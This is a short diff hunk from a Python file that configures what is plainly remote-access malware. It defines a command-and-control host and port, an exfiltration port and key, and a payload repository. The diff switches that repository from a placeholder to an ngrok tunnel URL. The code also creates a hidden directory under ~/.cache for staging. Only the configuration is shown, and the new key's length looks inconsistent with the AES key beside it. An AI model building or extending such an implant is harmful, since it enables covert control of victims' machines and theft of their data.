@@ -5,11 +5,11 @@ from Cryptodome.Random import get_random_bytes
 import zipfile, tempfile, shutil, sys
 
 SECRET_KEY = b'Sixteen byte key'
-EXFIL_KEY = b'TrinityRogueKey!'
+EXFIL_KEY = b'magicRogueKey!'
 C2_HOST = 'YOUR.C2.IP.HERE'
 C2_PORT = 4444
 EXFIL_PORT = 9090
-PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/"
+PAYLOAD_REPO = "https://abc123.ngrok.io/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
 
